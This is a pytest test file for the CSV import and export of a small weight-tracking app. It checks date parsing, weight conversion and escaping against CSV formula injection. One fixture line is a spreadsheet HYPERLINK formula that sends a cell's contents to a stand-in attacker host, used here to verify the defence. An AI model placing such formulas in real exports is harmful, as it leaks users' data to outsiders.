# Kilo Tracker - a small weight-tracking web app.
# Copyright (C) 2026 Ramón de Vries <ramon@11tools.com>
# SPDX-License-Identifier: AGPL-3.0-or-later
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU Affero General Public License as published
# by the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version. See the LICENSE file for the full text.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

"""Tests for CSV parsing and export."""

import csv
import io
from datetime import date

import pytest

from app.csv_io import (
    CsvRowError,
    data_rows,
    export_csv,
    format_ddmyy,
    parse_csv,
    parse_ddmyy,
    protect_cell,
    weight_kg,
)


def test_parse_ddmyy_two_digit_year():
    assert parse_ddmyy("23-9-26") == date(2026, 9, 23)


def test_parse_ddmyy_four_digit_year():
    assert parse_ddmyy("23-9-2026") == date(2026, 9, 23)


def test_parse_ddmyy_invalid_raises():
    with pytest.raises(CsvRowError):
        parse_ddmyy("not-a-date")
    with pytest.raises(CsvRowError):
        parse_ddmyy("32-13-26")


def test_format_ddmyy_round_trips():
    d = date(2026, 9, 23)
    assert format_ddmyy(d) == "23-9-26"
    assert parse_ddmyy(format_ddmyy(d)) == d


def test_parse_csv_basic_example():
    text = (
        "23-9-26,79.7,optional notes\n"
        "24-9-26,79.7,optional notes\n"
        "25-9-26,80.5,\n"
        "26-9-26,80.3,some text\n"
        "27-9-26,79.5,some text\n"
    )
    rows, errors = parse_csv(text)
    assert errors == []
    assert len(rows) == 5
    assert rows[0] == (date(2026, 9, 23), 79.7, "optional notes")
    assert rows[2] == (date(2026, 9, 25), 80.5, None)


def test_parse_csv_skips_invalid_lines():
    text = "1-1-26,80,\nbad-date,80,\n2-1-26,not-a-number,\n3-1-26,5000,\n4-1-26,81,ok\n"
    rows, errors = parse_csv(text)
    assert len(rows) == 2
    assert len(errors) == 3
    assert "line 2" in errors[0]
    assert "line 3" in errors[1]
    assert "line 4" in errors[2]


def test_parse_csv_ignores_blank_lines():
    rows, errors = parse_csv("1-1-26,80,\n\n\n2-1-26,81,\n")
    assert len(rows) == 2
    assert errors == []


def test_export_csv_round_trips_through_parse():
    class FakeEntry:
        def __init__(self, entry_date, weight, note):
            self.entry_date = entry_date
            self.weight = weight
            self.note = note

    entries = [FakeEntry(date(2026, 9, 23), 79.7, "hi"), FakeEntry(date(2026, 9, 24), 80.0, None)]
    text = export_csv(entries)
    rows, errors = parse_csv(text)
    assert errors == []
    assert rows == [(date(2026, 9, 23), 79.7, "hi"), (date(2026, 9, 24), 80.0, None)]


# --- notes that a spreadsheet would run as a formula ("CSV injection") ----------------------

FORMULA_NOTES = [
    "=HYPERLINK(\"http://evil.example/?\"&A1,\"click\")",
    "+31 6 12345678",
    "-2 kg this week",
    "@SUM(A1:A9)",
    "\t=1+1",
    "\r=1+1",
    "'=already quoted",
    "''-two apostrophes",
]
PLAIN_NOTES = ["hi", "a=b", "2+2", "'just an apostrophe", "'", "emoji 😊 = happy"]


class Entry:
    def __init__(self, note, day=23):
        self.entry_date = date(2026, 9, day)
        self.weight = 80.0
        self.note = note


def exported_notes(notes):
    text = export_csv([Entry(note, day) for day, note in enumerate(notes, start=1)])
    return [row[2] for row in csv.reader(io.StringIO(text))]


@pytest.mark.parametrize("note", FORMULA_NOTES)
def test_a_note_that_looks_like_a_formula_is_exported_with_an_apostrophe(note):
    (cell,) = exported_notes([note])
    assert cell == "'" + note
    assert cell[0] == "'"  # a spreadsheet shows it as text


@pytest.mark.parametrize("note", PLAIN_NOTES)
def test_other_notes_are_exported_unchanged(note):
    assert exported_notes([note]) == [note]


def test_every_note_survives_an_export_and_an_import():
    notes = FORMULA_NOTES + PLAIN_NOTES
    text = export_csv([Entry(note, day) for day, note in enumerate(notes, start=1)])
    rows, errors = parse_csv(text)
    assert errors == []
    assert [note for _date, _weight, note in rows] == notes


def test_no_exported_cell_starts_like_a_formula():
    text = export_csv([Entry(note, day) for day, note in enumerate(FORMULA_NOTES + PLAIN_NOTES, start=1)])
    for row in csv.reader(io.StringIO(text)):
        for cell in row:
            assert cell[:1] not in ("=", "+", "-", "@", "\t", "\r"), cell


def test_protect_cell_leaves_the_empty_note_alone():
    assert protect_cell("") == ""


def test_data_rows_skips_blank_lines_but_keeps_the_line_numbers():
    text = "1-1-26,80\n\n ,  , \n2-1-26,81\n,\n"
    assert list(data_rows(text)) == [(1, ["1-1-26", "80"]), (4, ["2-1-26", "81"])]


@pytest.mark.parametrize(
    "text, factor, digits, expected",
    [
        ("72,5", 1.0, None, (72.5, None)),
        ("72.12345", 1.0, None, (72.12345, None)),  # the plain CSV keeps what was typed
        ("180", 0.45359237, 3, (81.647, None)),  # pounds, rounded to grams
        ("abc", 1.0, None, (None, "invalid")),
        ("0.5", 1.0, None, (None, "range")),
        ("501", 1.0, None, (None, "range")),
        ("1200", 0.45359237, 3, (None, "range")),  # 544 kg: the range is checked in kg
    ],
)
def test_weight_kg(text, factor, digits, expected):
    assert weight_kg(text, factor, digits) == expected


def test_the_plain_csv_import_does_not_round_a_weight():
    rows, errors = parse_csv(b"1-1-26,72.12345\n")
    assert errors == [] and rows[0][1] == 72.12345
